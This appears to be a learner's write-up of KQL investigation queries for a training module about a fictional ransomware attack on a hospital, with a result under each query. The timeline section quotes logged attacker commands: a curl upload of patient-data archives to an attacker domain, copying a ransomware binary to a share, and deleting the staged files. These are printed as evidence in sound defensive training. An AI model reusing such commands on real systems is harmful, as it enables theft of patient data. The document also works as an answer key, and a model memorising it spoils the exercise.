// Module 7 — Jojo's Hospital: A Ransomware Investigation
// Dataset: Jojo's Hospital (kc7001.eastus/JoJosHospital) — same company as Module 6.
// Queries replayed and verified on 2026-10-22/23. Selection of pivotal queries out of
// 34 questions total (this module has a single section, no sub-sections).

// --- Scope: how widespread was the encryption? ---
FileCreationEvents | where filename endswith ".encrypted" | count
// → 6420 encrypted files

FileCreationEvents | where filename endswith ".encrypted" | distinct hostname | count
// → 321 distinct hosts affected

// --- The ransom note itself ---
FileCreationEvents | where filename == "We_Have_Your_Data_Pay_Up.txt"
// → SHA256 97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018
// → full path C:\Users\andavis\Documents\We_Have_Your_Data_Pay_Up.txt
// → created 2024-06-17T14:49:02Z by explorer.exe, seen on exactly 1 host: AMFB-MACHINE
// → (dropped mid-attack: after the first 2 exfil zips were staged, before the curl uploads)

// --- Pivot: which employee owns that host? ---
Employees | where hostname == "AMFB-MACHINE"
// → Anthony Davis (andavis@jojoshospital.org, ip_addr 10.10.0.1)

// --- The core evidence: full process timeline on the ransom-note host ---
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) .. datetime(2024-06-18))
| sort by timestamp asc
// → 14 events. The attack chain in one query:
//   13:35:12 cmd.exe /c copy C:\Users\andavis\Downloads\lockbyte_ransomer.exe
//            \\jojos-hospital.org\shared\spread_ransomware.exe        (lateral spread)
//   14:23:25 patient_data_exporter.exe /export patient_data_1.zip
//            /source \\jojos-hospital-server\important_data\patient_records
//   14:56:02 ... patient_data_2.zip /source ...\archive\patient-records
//   15:54:53 ... patient_data_3.zip /source ...\old-patient-data        (staging 3 zips)
//   17:18:57 cmd.exe /c curl -T patient_data_1.zip
//            https://secure-health-access.com/upload/patient_data_1.zip
//   17:30:31 / 17:31:50 ... same curl pattern for zips 2 and 3           (exfiltration)
//   17:36:47 cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip (anti-forensics)

// --- Where did the exfil/download tool come from? ---
OutboundNetworkEvents | where url has "patient_data_exporter.exe"
// → downloaded from https://secure-health-access.com/tools/patient_data_exporter.exe
// → 2024-06-17T14:22:29Z, src_ip 10.10.0.1 (Anthony Davis's own workstation)

// --- Pivot: infrastructure behind the download domain ---
PassiveDns | where domain == "secure-health-access.com"
// → resolves to 2 IPs: 203.0.113.1, 203.0.113.2 (resolutions seen 2024-05-17 .. 05-19)

PassiveDns | where ip in ("203.0.113.1", "203.0.113.2") | distinct domain
// → second domain sharing this infrastructure: emr-help.net

// --- Did the attackers scout the hospital website from that infrastructure? ---
InboundNetworkEvents | where src_ip in ("203.0.113.1", "203.0.113.2") | count
// → 37 requests (reconnaissance: searches for "bypass security", "patient records", etc.)

// --- Initial access: did they log into anything from that infrastructure? ---
AuthenticationEvents | where src_ip in ("203.0.113.1", "203.0.113.2")
// → 1 result: 2024-05-20T00:00:00Z, hostname MAIL-SERVER01, username andavis,
//   result "Successful Login", description "A user attempted to log in to their email"
//   — a full MONTH before the ransomware deployment on 06-17. This is an email-account
//   compromise, not a direct workstation login. The module's 34 questions stop here —
//   how the credentials were obtained (phishing / credential stuffing / purchased) is
//   not covered and is left as an open question in the write-up.
